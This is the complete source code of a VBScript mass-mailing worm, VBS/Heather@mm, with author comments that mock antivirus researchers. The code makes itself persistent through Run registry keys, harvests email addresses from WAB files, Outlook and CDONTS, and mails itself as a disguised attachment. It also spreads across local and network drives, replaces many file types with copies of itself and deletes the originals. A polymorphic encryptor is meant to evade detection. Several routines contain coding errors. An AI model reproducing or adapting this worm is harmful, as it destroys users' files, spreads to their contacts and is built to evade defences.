Rem VBS/Heather@mm by FSo.
Rem Haven't you AVers realized yet that your heuristics suck?
Rem To all the creators out there, keep it alive...
Rem Greets and Thanks:
Rem Zulu - Thanks just for the encouragment and putting up with me.
Rem S@t@n!k Ch!ld - Damn this fuckin' DSL...! (boom)
Rem CyberWarrior - 'Why do you want it so bad, it just uses some stupid DOS features...'
Rem Sugien - 'I don't want my 15 minutes or even 15 seconds of fame...' (Bullshit!)
Rem Nick Fitzgerald - Please stay; I love your outbursts!
Rem Mike Bleiweiss - I agree!  acvsc needs more flame wars!
Rem Blooven - Pathetic little twerp.  But, anyway, thanks for giving me my hourly laugh.
Rem	BTW you are so stupid, writing viruses is not illegal!
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set ScrBuf = FSO.OpenTextFile(WScript.ScriptFullName)
VirusBuff = ScrBuf.ReadAll
ScrBuf.Close
VirusBuff = Replace(VirusBuff, Chr(39), "")
EndStr = "Rem <--- Exit Heather"
VirBegin = InStr(1, VirusBuff, "Rem VBS/Heather@mm by FSo.")
VirusLoc = InStr(1, VirusBuff, EndStr)
VirusLoc2 = InStr(VirusLoc + Len(EndStr), VirusBuff, EndStr) + VirusLoc + (Len(EndStr) * 2) - VirBegin
CryptStr = "Rem <--- Begin Crypt"
CryptLoc = InStr(1, VirusBuff, CryptStr)
CryptLoc2 = InStr(CryptLoc + Len(CryptStr), VirusBuff, CryptStr) + CryptLoc + (Len(CryptStr) * 2) + 2
NCryptBuff = Mid(VirusBuff, 1, CryptLoc2 - 4)
CryptBuff = Mid(VirusBuff, CryptLoc2, VirusLoc2 - CryptLoc2)
Seed = Asc(Mid(CryptBuff, 1, 1)) - Asc("R")
If Seed = 0 Then GoTo SkipCrypt
For CryptLen = 1 To Len(CryptBuff)
	CryptChar = Asc(Mid(CryptBuff, X, 1)) - Seed
	If CryptChar < 0 Then
		CryptChar = 255 - Abs(CryptChar)
	End If
	ExecuteBuff = ExecuteBuff&Chr(CryptChar)
Next
Execute ExecuteBuff
SkipCrypt:
Rem <--- Begin Crypt

Rem Pretty complicated decryptor.  I required the decryptor in this worm to be dynamic because 
Rem the poly engine changes the size up and down (not just up like some of that crap!)

Call EncryptCode
Set WshShell = CreateObject("WScript.Shell")
If WshShell.RegRead("HKLM\Heather\") = "Makes Me Complete" Then GoTo AlreadyDidMachine
Call PolyCode
Randomize
Ssf = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
intSpf = Int(Rnd * 150)
If intSpf = 1 Then
	Spf = FSO.GetSpecialFolder(0)
ElseIf intSpf = 2 Then
	Spf = FSO.GetSpecialFolder(1)
ElseIf intSpf = 3 Then
	Spf = FSO.GetSpecialFolder(2)
ElseIf intSpf = 4 Then
	Spf = "C:\RECYCLED"
ElseIf intSpf = 5 Then
	Spf = WshShell.RegRead(Ssf&"AppData")
ElseIf intSpf = 6 Then
	Spf = WshShell.RegRead(Ssf&"Cache")
ElseIf intSpf = 7 Then
	Spf = WshShell.RegRead(Ssf&"Cookies")
ElseIf intSpf = 8 Then
	Spf = WshShell.RegRead(Ssf&"Fonts")
ElseIf intSpf = 9 Then
	Spf = WshShell.RegRead(Ssf&"NetHood")
ElseIf intSpf = 10 Then
	Spf = WshShell.RegRead(Ssf&"PrintHood")
Else
	Spf = WshShell.RegRead(Ssf&"Templates")
End If
FileLen = Int(Rnd * 8) + 1
For FileChars = 1 To FileLen
	FileVar = FileVar&Chr(Int(Rnd * 26) + 64)
Next
RegBase = FileVar
FileVar = Spf&"\"&FileVar
Set ShellFile = FSO.CreateTextFile(FileVar, True)
ShellFile.Write NCryptBuffer&vbCrLf&CryptBuffer
ShellFile.Close
FSO.GetFile(FileVar).Attributes = 39
RegKey = Int(Rnd * 4) + 1
If RegKey = 1 Then
	Key = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
ElseIf RegKey = 2 Then
	Key = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\"
ElseIf RegKey = 3 Then
	Key = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
Else
	Key = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices\"
End If
WshShell.RegWrite Key&RegBase, FileVar

Rem Very advanced code to register worm as a shell service.  That'll jack up the removal ratings
Rem a bit...

AlreadyDidMachine:
Set WshNetwork = CreateObject("WScript.Network")
Set WNEnum = WshNetwork.EnumNetworkDrives
For NetNum = 0 To WNEnum.Count - 2 Step 2
	InfectFiles(NetNum.Item&"\")
Next

Rem Enumerate networked devices (even unmapped ones) and use their UNC names as an infection path

If WshShell.RegRead("HKLM\SOFTWARE\Miss Arnote\") = "Captivates..." Then GoTo SkipMail
AppData = WshShell.RegRead(Ssf&"AppData")
For Each MSWab In FSO.GetFolder(AppData&"\Microsoft\Address Book").Files
	If UCase(FSO.GetExtensionName(MSWab.Path)) = "WAB" Then
		WabFile = MSWab.Path
		Exit For
	End If
Next
If WabFile = "" Then GoTo SkipWab
Set WabOpen = FSO.OpenTextFile(WabFile)
WabBuff = WabOpen.ReadAll
strFindAt = 1
strOldAddr = 1
Do While Null = Null
	strFindAt = InStr(strOldAddr, WabBuff, "@")
	If strFindAt = 0 Then Exit Do
	AddyBuff = ""
	strChar = 1
	Do While Null = Null
		szChar = Mid(WabBuff, strFindAt - strChar, 1)
		If Not szChar = Chr(0) Then
			AddyBuff = szChar&AddyBuff
			strChar = strChar + 1
		Else
			Exit Do
		End If
	Loop
	strChar = 1
	Do While Null = Null
		szChar = Mid(WabBuff, strFindAt - strChar, 1)
		If Not szChar = Chr(0) Then
			AddyBuff = AddyBuff&szChar
			strChar = strChar + 1
		Else
			Exit Do
		End If
	Loop
	If InStr(1, AddyString, AddyBuff) = 0 Then AddrBuff = AddyString&AddyBuff&"; "
	strFindAt = strFindAt + strChar + 1
Loop
WabOpen.Close

Rem Interesting hack for getting addresses from WAB address books in the background.  I created
Rem this sucker because I was sick and tired of using DDE to exploit Outlook Express/WAB stuff.
Rem Thanks to Satanik Child for idea of OE spreading.  Idea on getting addresses from WAB based
Rem on Win32.Magistr worm.

Set MSOutlook = CreateObject("Outlook.Application")
Set OutlMapi = MSOutlook.GetNameSpace("MAPI")
For FldrCnt = 1 To OutlMapi.Folders.Count
	If FldrCnt = 2 Then GoTo SkipFldr
	For Each OutlItem Is OutlMapi.Folders(FldrCnt).Items
		For Each VirRecip In OutlItem.Recipients
			If InStr(1, AddrString, VirRecip.Address) = 0 Then AddrString = AddrString&VirRecip.Address&"; "
		Next
	Next
SkipFldr:
Next
For Each OutlBook In OutlMapi.AddressLists
	For Each OutlCntct In OutlBook.AddressEntries
		If InStr(1, AddrString, OutlCntct.Address) = 0 Then AddrString = AddrString&OutlCntct.Address&"; "
	Next
Next

Rem Get even more e-mail addresses by flipping through the user's MS Outlook folders, and address
Rem book.

Set CdoMapi = CreateObject("CDONTS.Session")
CdoMapi.LogonSMTP
For Each InboxCdo In CdoMapi.Inbox.Messages
	For Each CdoRecip In InboxCdo.Recipients
		If InStr(1, CdoRecip.Address, AddrString) = 0 Then AddrString = AddrString&CdoRecip.Address&" ;"
	Next
Next

Rem Get some addresses from the Inbox of the CDONTS e-mail service, which ships with MS IIS.

If Not MSOutlook Is Nothing Then
	bIsOutlook = True
ElseIf Not CdoMapi Is Nothing Then
	bIsOutlook = False
Else
	GoTo SkipMail
End If

Rem Decide course of action for e-mail propogation.

RcntFldr = WshShell.RegRead(Ssf&"Recent")
For Each RcntFile In FSO.GetFolder(RcntFldr).Files
	RcntPath = Mid(RcntFile.Name, 1, Len(RcntFile.Name) - InStrRev(RcntFile.Name, ".") - 1)
	RcntExt = UCase(Right(RcntPath, InStrRev(RcntPath, ".") - 1))
	If RcntExt = "DOC" Or RcntExt = "DOT" Or RcntExt = "MP3" Or RcntExt = "WAV" Or RcntExt = "XLS" Or RcntExt = "PPT" Or RcntExt = "RTF" Or RcntExt = "TXT" Or RcntExt = "HTM" Or RcntExt = "HTML" Or RcntExt = "XLS" Then
		RcntName = RcntPath
		RcntSubj = RcntPath
		RcntText = RcntPath&" - Cool file, got this one from a friend.  You'll love it."
		Exit For
	End If
Next
If RcntName = "" Then RcntName = "HEATHER.JPG"
If RcntSubj = "" Then RcntSubj = "Awesome Pic!"
If RcntText = "" Then RcntName = ">Now here is one beautiful lady..."
RcntName = RcntName&".vbs"
Randomize
FwStyle = Int(Rnd * 3) + 1
If FwStyle = 1 Then
	RcntSubj = "Fw: "&RcntSubj
ElseIf FwStyle = 2 Then
	RcntSubj = "Fwd: "&RcntSubj
End If
Call PolyCode
RealRcnt = FSO.GetSpecialFolder(0)&"\"&RcntName
Set VirusAttach = FSO.CreateTextFile(RealRcnt, True)
VirusAttach.Write NCryptBuff&vbCrLf&CryptBuff
VirusAttach.Close

Rem On the fly generation of viral message (pieces based on VBS/Stages and VBS/NewLove)
Rem Uses a file from Recent as a base (as NewLove did) and chooses "Fw: " crap at random (As did
Rem Stages).

If bIsOutlook Then
	Set MsgItem = MSOutlook.CreateItem(0)
Else
	Set MsgItem = CdoMapi.Outbox.Messages.Add
End If
MsgItem.BCC = AddyString
MsgItem.Subject = RcntSubj
MsgItem.Attachments.Add(RealRcnt)
If bIsOutlook Then MsgItem.DeleteAfterSubmit = True
MsgItem.Send
WshShell.RegWrite "HKLM\SOFTWARE\Miss Arnote\", "Captivates..."

Rem Send e-mail using CDONTS/Outlook if present.

SkipMail:
For Each FsoDrive In FSO.Drives
	num = num + InfectFiles(FsoDrive.Path&"\", num)
Next

Rem Search the system for appropriate files, and infect.

WshShell.Popup "Dedicated to Heather Arnote, who has set a wonderful example for us all."&vbCrLf&"Thanks, to people like Heather for upholding the spirit of society in such a corrupt place."&vbCrLf&"Evolution is necessary for survival.  If you do not evolve, you die.  If this society holds on to its 18th century beliefs, in this, the 21st century, a world nuked to the bone with cyber and physical threats, it too will die."&vbCrLf&"Sadly to say, it is already withering...  Like an old rose... And it eventually, will die."&vbCrLf&"And as you can see the inability of 18th century ideals to combat this threat, what is our future?"&vbCrLf&"When computers will be in household appliances, and appliances will be linked to the world."&vbCrLf&"Will we have hack attacks on toaster ovens?"&vbCrLf&"Just some food for thought."&vbCrLf&vbCrLf&"VBS/Heather is copyright (c), FileSystemObject, July 2001."&vbCrLf&"I'm sorry, but "&CStr(num)" of your files have been infected or destroyed.  I hope you enjoy restoring them as much as I enjoyed writing this!"&vbCrLf&vbCrLf&"Once again, food for thought...  How can a world that is repeatedly brought to its knees by simple pieces of script survive when everything will be connected.  Do you want to live like this?", 0, "A Message from FileSystemObject", 

Function InfectFiles(fspec, num)
On Error Resume Next
For Each FsoFile In FSO.GetFolder(fspec).Files
	FileExt = UCase(FSO.GetExtensionName(FsoFile.Path))
	FilePath = FsoFile.Path
	If Extn = "AIF" Or Extn = "AIFF" Or Extn = "AIFC" Or Extn = "ARC" Or Extn = "ARJ" Or Extn = "ASF" Or Extn = "ASP" Or Extn = "AVI" Or Extn = "BKS" Or Extn = "BMP" Or Extn = "CAB" Or Extn = "CHM" Or Extn = "CSS" Or Extn = "DAT" Or Extn = "DIB" Or Extn = "DOT" Or Extn = "DOC" Or Extn = "WLL" Or Extn = "WIZ" Or Extn = "EML" Or Extn = "FDF" Or Extn = "GIF" Or Extn = "GZ" Or Extn = "HLP" Or InStr(1, Extn, "HT") > 0 Or Extn = "INF" Or Extn = "IVF" Or Extn = "JFIF" Or Extn = "JPG" Or Extn = "JPE" Or Extn = "JPEG" Or Extn = "JS" Or Extn = "JSE" Or Extn = "LHA" Or Extn = "LOG" Or Extn = "LZH" Or Extn = "M1V" Or Extn = "M3U" Or Extn = "MAPIMAIL" Or Extn = "MBF" Or Extn = "MID" Or Extn = "MIDI" Or Extn = "MIDS" Or Extn = "MIM" Or Extn = "MIZ" Or Extn = "MJF" Or Extn = "MNY" Or Extn = "MOD" Or Extn = "MOV" Or Mid(Extn, 1, 2) = "MP" Or Extn = "MSG" Or Extn = "MSI" Or Extn = "MSP" Or Extn = "MSS" Or Extn = "MTM" Or Extn = "MUS" Or Extn = "MZIP" Or Extn = "NST" Or Extn = "NWS" Or Extn = "OCX" Or Ext = "OBD" Or Extn = "OFC" 	Or Extn = "OFX" Or Extn = "PDF" Or Extn = "PNG" Or Extn = "POT" Or Extn = "PPS" Or Extn = "PPT" Or Mid(Extn, 1, 2) = "QD" Or Extn = "QIF" Or Extn = "QWB" Or Extn = "RAR" Or Extn = "REG" Or Extn = "RMI" Or Extn = "RTF" Or Extn = "S3M" Or Extn = "SCT" Or Extn = "SHB" Or Extn = "SHS" Or Extn = "SND" Or Extn = "TAR" Or Extn = "TAZ" Or Extn = "TGZ" Or Extn = "TIF" Or Extn = "TIFF" Or Extn = "TLB" Or Extn = "TXT" Or Extn = "TZ" Or Extn = "UU" Or Extn = "UUE" Or Extn = "WAB" Or Extn = "WAV" Or Extn = "WDB" Or Extn = "WKS" Or Extn = "WMP" Or Extn = "MPP" Or Extn = "MPT" Or Extn = "WRI" Or Extn = "WSC" Or Extn = "WSF" Or Extn = "WSH" Or Extn = "XML" Or Extn = "XSL" Or Mid(Extn, 1, 2) = "XL" Then
		Set VbsReplace = FSO.CreateTextFile(FilePath&".vbs")
		Call PolyCode
		VbsReplace.Write NCryptBuff&vbCrLf&CryptBuff
		VbsReplace.Close
		FSO.DeleteFile FsoFile.Path
		num = num + 1

Rem Damage routine.  This will add a ".vbs" to a number of different extensions and infect that
Rem new file with the worm, after which it will delete the original.  Many files will not be able
Rem to be recovered.

	ElseIf Extn = "VBE" Then
		Set ReadVictim = FSO.OpenTextFile(FilePath)
		szVbe = ReadVictim.ReadAll
		szFindVir = InStr(1, szVbe, "Rem VBS/Heather@mm by FSo.")
		ReadVictim.Close
		If szFindVir = 0 Then
			Call PolyCode
			Set VbeWrite = FSO.CreateTextFile(FilePath, True)
			VbeWrite.Write NCryptBuff&vbCrLf&CryptBuff&vbCrLf&szVbe
			VbeWrite.Close
		End If
		num = num + 1

Rem VBE infection.  Infect by prepending (any other way you get an error, kinda stupid!)

	ElseIf Extn = "VBS" Or Extn = "WSF" Then
		Set ReadVbsVictim = FSO.OpenTextFile(FilePath)
		szVbs = ReadVbsVictim.ReadAll
		szFindVbsVir = InStr(1, szVbs, "Rem VBS/Heather@mm by FSo.")
		VbsSplit() = Split(szVbs, vbCrLf)
		NumOfLines = UBound(VbsSplit)
		ReadVbsVictim.Close
		If szFindVbsVir = 0 Then
			Randomize
			LineNum = Int(Rnd * NumOfLines) + 1
			If Extn = "WSF" And LineNum < 4 Then LineNum = 4
			Set WriteVbs = FSO.CreateTextFile(FilePath, True)
			For SplitCount = 0 To LineNum - 1
				WriteVbs.WriteLine VbsSplit(SplitCount)
			Next
			Call PolyCode
			WriteVbs.WriteLine NCryptBuff&vbCrLf&CryptBuff
			For SplitCount = LineNum To UBound(VbsSplit)
				WriteVbs.WriteLine VbsSplit(SplitCount)
			Next
		End If
		num = num + 1
	End If
Next
InfectFiles = num
End Sub

Rem Interesting hack on VBS/WSF infection.  I could have made it EPO, but the jump would have
Rem defeated the purpose of mid-file insertion: disguise, and to beat heuristics.  The EPO jump
Rem would go immediately to our virus code.  This would look suspicious because a decryptor in
Rem the middle of a file, pointed to by a GoTo would just be weird.  Also, the user would surely
Rem see an inserted goto immediately, unless they had like a page of comments (and even that may
Rem not hide it!)

Sub EncryptCode()
On Error Resume Next
Randomize
Seed = Int(Rnd * 254) + 1
CryptBuff = Replace(CryptBuff, Chr(39), "")
For CryptoLen = 1 To Len(CryptBuff)
	ChAsc = Asc(Chr(Mid(CryptBuff, CryptoLen, 1))) + Seed
	If ChAsc > 255 Then
		ChAsc = ChAsc - 255
	End If
	If ChAsc = 10 Or ChAsc = 13 Then NewCrypt = NewCrypt&Chr(39)
	NewCrypt = NewCrypt&Chr(ChAsc)
Next
CryptBuff = Chr(39)&CryptBuff
End Sub

Rem Polymorphic encyptor.  Chooses a random seed and uses ASCII char table to encode all chars in
Rem the virus body that need to be encoded (i.e, not the decryptor!)

Sub PolyCode()
On Error Resume Next
PolyArr(96) = Array("FSO", "ScrBuf", "VirusBuff", "EndStr", "VirusLoc", "VirusLoc2", "CryptStr", "CryptLoc", "CryptLoc2", "NCryptBuff", "CryptBuff", "Seed", "CryptLen", "ExecuteBuff", "SkipCrypt", "PolyArr", "PolyLen", "NameLen", "NewVar", "CharCount", "CharType", "CharCase", "PolyCode", "EncryptCode", "CryptoLen", "ChAsc", "NewCrypt", "WshShell", "Ssf", "intSpf", "FileLen", "FileChars", "FileVar", "RegBase", "WshNetwork", "WNEnum", "NetNum", "InfectFiles", "SkipMail", "CacheFldr", "AddyString", "AppData", "MSWab", "WabFile", "WabOpen", "WabBuff", "strFindAt", "strOldAddr", "AddyBuff", "strChar", "szChar", "MSOutlook", "OutlMapi", "FldrCnt", "SkipFldr", "OutlItem", "VirRecip", "OutlBook", "OutlCntct", "CdoMapi", "InboxCdo", "CdoRecip", "bIsOutlook", "RcntFldr", "RcntFile", "RcntPath", "RnctExt", "RcntName", "RcntSubj", "RcntText", "FwStyle", "RealRcnt", "VirusAttach", "MsgItem", "FsoDrive", "InfectFiles", "fspec", "num", "FsoFile", "FileExt", "FilePath", "Extn", "VbsReplace", "ReadVictim", "szVbe", "szFindVir", "ReadVictim", "VbeWrite", "szVbs", "szFindVbsVir", "ReadVbsVictim", "VbsSplit", "NumOfLines", "LineNum", "WriteVbs", "SplitCount")
Randomize
For PolyLen = 0 To UBound(PolyArr)
	NewVar = ""
	NameLen = Int(Rnd * 10) + 5
	For CharCount = 1 To NameLen
		CharType = Int(Rnd * 2) + 1
		If CharType = 1 Then
			NewVar = NewVar&CStr(Int(Rnd * 10))
		Else
			CharCase = Int(Rnd * 2) + 1
			Char = Int(Rnd * 26) + 64
			If CharCase = 1 Then
				NewVar = NewVar&UCase(Chr(Char))
			Else
				NewVar = NewVar&LCase(Chr(Char))
			End If
		End If
	Next
	NCryptBuff = Replace(NCryptBuff, PolyArr(PolyLen), NewVar)
	ExecuteBuff = Replace(ExecuteBuff, PolyArr(PolyLen), NewVar)
Next
End Sub

Rem Poly engine.  This drastically changes the size of the virus with every infection.  Another
Rem awesome advantage of this is that the virus will be reported as 'No Remover Available' or a
Rem similar thing by AVs, especially being it inserts itself in a random location in infected 
Rem VBS, and WSF files.  (inserts at beginning of VBE, else you get an error on run.)